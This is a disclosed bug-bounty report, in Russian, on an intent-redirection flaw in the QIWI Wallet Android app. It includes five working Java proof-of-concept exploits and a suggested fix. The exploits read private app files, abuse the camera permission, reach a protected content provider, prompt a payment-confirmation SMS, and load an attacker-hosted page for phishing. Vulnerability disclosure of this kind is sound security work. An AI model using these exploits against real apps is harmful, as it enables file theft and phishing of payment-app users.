---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '482998'
original_report_id: '482998'
title: '[QIWI Wallet] Access to protected app components'
weakness: Privilege Escalation
team_handle: qiwi
created_at: '2019-01-20T22:58:03.837Z'
disclosed_at: '2021-07-06T14:11:11.046Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 26
asset_identifier: ru.mw
asset_type: GOOGLE_PLAY_APP_ID
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# [QIWI Wallet] Access to protected app components

## Metadata

- HackerOne Report ID: 482998
- Weakness: Privilege Escalation
- Program: qiwi
- Disclosed At: 2021-07-06T14:11:11.046Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Здравствуйте, я хочу сообщить об обнаруженной уязвимости в классе `ru.mw.main.Main`

###Информация о приложении

Приложение: QIWI Кошелек
Имя пакета: `ru.mw`
Номер версии: `3.25.0`
Код версии: `21346`
Актуальность версии: Последняя
Уязвимый класс: `ru.mw.main.Main`

###Уязвимость

Поскольку активность `ru.mw.Main` экспортирована, можно отправить intent в класс `ru.mw.main.Main` там есть уязвимый метод `onResume()`
```java
public class Main extends QiwiPresenterActivity<a, ru.mw.main.b.a> implements AccountManagerCallback<Bundle>, OnCloseListener, OnQueryTextListener, OnSuggestionListener, ru.mw.authentication.a.a, ru.mw.main.c.a {
...
public void onResume() {
        super.onResume();
        Class cls = getClass();
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("MAIN: ");
        stringBuilder.append(Thread.currentThread().getStackTrace()[2].getMethodName());
        Utils.a(cls, stringBuilder.toString());
        ((ru.mw.main.b.a) aS_()).a();
        CharSequence stringExtra = getIntent().getStringExtra(FCMIntentHandlerActivity.b);
        Intent intent = (Intent) getIntent().getParcelableExtra(FCMIntentHandlerActivity.c);//NEXT_INTENT
        if (Utils.a(intent)) {
            startActivity(intent);//start malicious intent
        } else if (!TextUtils.isEmpty(stringExtra)) {
            if (intent != null) {
                TextDialog.a(stringExtra, intent).a(getSupportFragmentManager(), C());//start malicious intent
            } else {
                TextDialog.a(stringExtra).a(getSupportFragmentManager(), C());
            }
        }

```
Метод `onResume()` позволяет запускать intent злоумышленника , с помощью данной уязвимости можно получить доступ к защищённым компонентам приложений такие как активности, контент-провайдеры, которые недоступны для внешних приложений и содержат `android:exported="false"` 

###PoC
**PoC 1 - Чтение файлов в папке /data/data/ru.mw без root**
```java
  Intent next = new Intent("android.intent.action.VIEW", Uri.parse("qiwi://promo.web?url=https://xssvenmo.biz/mer.php"));
        next.setClassName("ru.mw","ru.mw.WebInfoActivity");
        next.putExtra("InfoActivity_extra_url","file:///data/data/ru.mw/shared_prefs/ru.mw_preferences.xml");

        Intent intent = new Intent();
        intent.setClassName("ru.mw","ru.mw.Main");
        intent.putExtra("gcm_intent", next);
        intent.putExtra("intent_extra_data_key","45 /ryyhr/nkj");
        startActivity(intent);
```
**PoC 2 - Get Permission**   `<uses-permission android:name="android.permission.CAMERA"/>`
```java
    Intent next =  new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        next.putExtra(MediaStore.EXTRA_OUTPUT, Uri.parse("content://ru.mw.provider/files/416.jpg"));

        Intent intent = new Intent();
        intent.setClassName("ru.mw","ru.mw.Main");
        intent.putExtra("gcm_intent", next);
        intent.putExtra("gcm_body", "Идентификация\n\nПодтвердите личность, сделайте селфи!!!!!");
        intent.putExtra("intent_extra_data_key","45 /ryyhr/nkj");
        startActivity(intent);
```
Ваше приложение разрешает пользоваться камерой другому приложения, которое не имеет на это разрешение. Так же можно вывести уведомление для прохождения идентификации и попросить сделать фотографию от лица вашего приложения, затем сохранить фотографию в защищённый контент-провайдер приложения, все эти действия будет выполнять приложение QIWI кошелёк.
Уязвимость включена в [Google Play Security Reward Program](https://hackerone.com/googleplay) (Раздел 3 «Access to protected app components»)
**PoC 3 - Получение доступа к защищённому контент-провайдеру приложения**
```java
  Intent next =  new Intent("android.intent.action.VIEW");
        next.setClassName(getPackageName(),getPackageName()+".TheftData");
        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        next.setData(Uri.parse("content://ru.mw.provider/files/416.jpg"));
        next.putExtra("keepAliveActivity",true);
        Intent intent = new Intent();
        intent.setClassName("ru.mw","ru.mw.Main");
        intent.putExtra("gcm_intent", next);
        intent.putExtra("gcm_body", "Получить доступ к защищённому провайдеру приложения?");
        intent.putExtra("intent_extra_data_key","45 /ryyhr/nkj");
        startActivity(intent);
```
С помощью данной уязвимость злоумышленник может получить доступ к провайдеру `android.support.v4.content.FileProvider` и его файлам. В качестве примера, я разрешаю вредоносному приложению прочитать фотографию, которая была сделана ранее (см. PoC 2) и сохранена в контент-провайдере.
F409689
F409714
**PoC 4 - Отправка SMS для подтверждения перевода**
```java
 Intent next =  new Intent("android.intent.action.VIEW");
        next.setData(Uri.parse("smsto:QIWIWallet"));
        next.putExtra("sms_body", "HackerOne");
        Intent intent = new Intent();
        intent.setClassName("ru.mw","ru.mw.Main");
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("gcm_intent", next);
        intent.putExtra("gcm_body", "Подтвердите платеж\n\nМы отправили SMS, подтвердите отправку платежа, ответив на него");
        intent.putExtra("intent_extra_data_key","45 /ryyhr/nkj");
        startActivity(intent);
```
В приложении QIWI Кошелек есть функционал при котором требуется отправить sms на определённый номер чтобы подтвердить перевод. Поскольку после нажатия кнопки подтверждения в `TextDialog` отправляется Intent то можно заставить пользователя отправить sms на номер злоумышленника.
F409690
**PoC 5 - Открытие WebView (Theft of insecure private data)**
```java
  Intent next = new Intent("ru.mw.action.VIEW_WEB_PAGE", Uri.parse("https://xssvenmo.biz/qiwi"));
        next.setClassName("ru.mw","ru.mw.WebViewActivity");
        Intent intent = new Intent();
        intent.setClassName("ru.mw","ru.mw.Main");
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("gcm_intent", next);
        intent.putExtra("gcm_body", "HackerOne");
        intent.putExtra("intent_extra_data_key","45 /ryyhr/nkj");
        startActivity(intent);
```
Или
```java
     Intent next = new Intent("android.intent.action.VIEW", Uri.parse("qiwi://promo.web?url=https://xssvenmo.biz/mer.php"));
        next.setClassName("ru.mw","ru.mw.WebInfoActivity");
        next.putExtra("InfoActivity_extra_url","https://xssvenmo.biz/mer.php");

        Intent intent = new Intent();
        intent.setClassName("ru.mw","ru.mw.Main");
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("gcm_intent", next);
        intent.putExtra("intent_extra_data_key","45 /ryyhr/nkj");
        startActivity(intent);
```
В приложении есть два класса WebView которые эксплуатируются с помощью данной уязвимостью `ru.mw.WebInfoActivity` и `ru.mw.WebViewActivity`
Данный PoC позволяет заменить контент приложения на свой. В результате пользователь не сможет понять разницу между вашим приложением и контентом злоумышленника. Уязвимость включена в [Google Play Security Reward Program](https://hackerone.com/googleplay) (Раздел 2 «Theft of insecure private data»)

###Воспроизведение уязвимости
Скачать/Установить: [QIWI Кошелек] (https://play.google.com/store/apps/details?id=ru.mw)
Установить Pin-код в приложении QIWI Кошелек
Предоставить разрешение для камеры вручную: F409713
Скачать/Установить: {F409686}
Нажимать на кнопки с 1-6, желательно по порядку.
Если приложение QIWI начнёт зависать или PoC не работать, закройте приложение QIWI смахнув его из задач, и нажмите нужную PoC кнопку.
###Fix
Для исправления ошибки необходимо добавить проверку intent, а именно поверить имя пакета и класс который собираемся запускать.
 Примерный код правильной проверки:
```java
ComponentName component = intent.getComponent();
         if (component == null) {
             return false;
         }
         String className = component.getClassName();
         for (Object equals : F) {
             if (className.equals(equals)) {
                 return true;
             }
         }
 ...
         String package_name = intent.getPackage();
         if (package_name.equals(string_white_pkg_name)) {
                 return true;
             }
```

## Impact

Уязвимость позволяет получить доступ к защищённым компонентам приложения и управлять ими.
Можно заменить контент приложения.
Можно получить доступ к файлам приложения.
Можно воспользоваться разрешением приложения для доступа к функциям, которые требуют прав доступа.
Можно проводить фишинг атаки.
Можно программировать `TextDialog`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
